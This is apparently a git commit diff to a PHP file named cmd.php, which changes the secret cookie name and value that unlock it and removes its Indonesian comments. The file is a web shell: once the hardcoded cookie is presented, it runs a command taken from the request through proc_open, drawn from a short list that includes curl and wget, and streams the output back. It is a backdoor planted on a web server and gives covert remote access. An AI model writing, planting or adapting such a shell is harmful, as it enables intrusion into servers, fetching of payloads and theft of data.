f0b3da5d28195f8a2322ec7316ac0eb72d99c1eb
dan1584 <pewedandi32@gmail.com>
2025-01-28 16:21:43 +0700

    Update cmd.php

--- cmd.php
+++ cmd.php
@@ -1,22 +1,20 @@
 <?php
-$validCookieValue = "aksesdiperbolehkan";
 
-if (isset($_COOKIE['burungkenari']) && $_COOKIE['burungkenari'] === $validCookieValue) {
+if (isset($_COOKIE["anjing"]) && $_COOKIE["anjing"] == "anjing") {
     if (isset($_REQUEST['system'])) {
         $allowedCommands = ['ls', 'pwd', 'curl', 'wget', 'whoami'];
         $command = $_REQUEST['system'];
 
         if (in_array($command, $allowedCommands)) {
             $process = proc_open($command, [
-                1 => ['pipe', 'w'], // Output normal
-                2 => ['pipe', 'w'], // Output error
+                1 => ['pipe', 'w'],
+                2 => ['pipe', 'w'],
             ], $pipes);
 
             if (is_resource($process)) {
-                // Baca stream output secara real-time
                 while ($line = fgets($pipes[1])) {
                     echo "<pre>" . htmlspecialchars($line) . "</pre>";
-                    flush(); // Kirim buffer ke browser
+                    flush();
                     ob_flush();
                 }
 
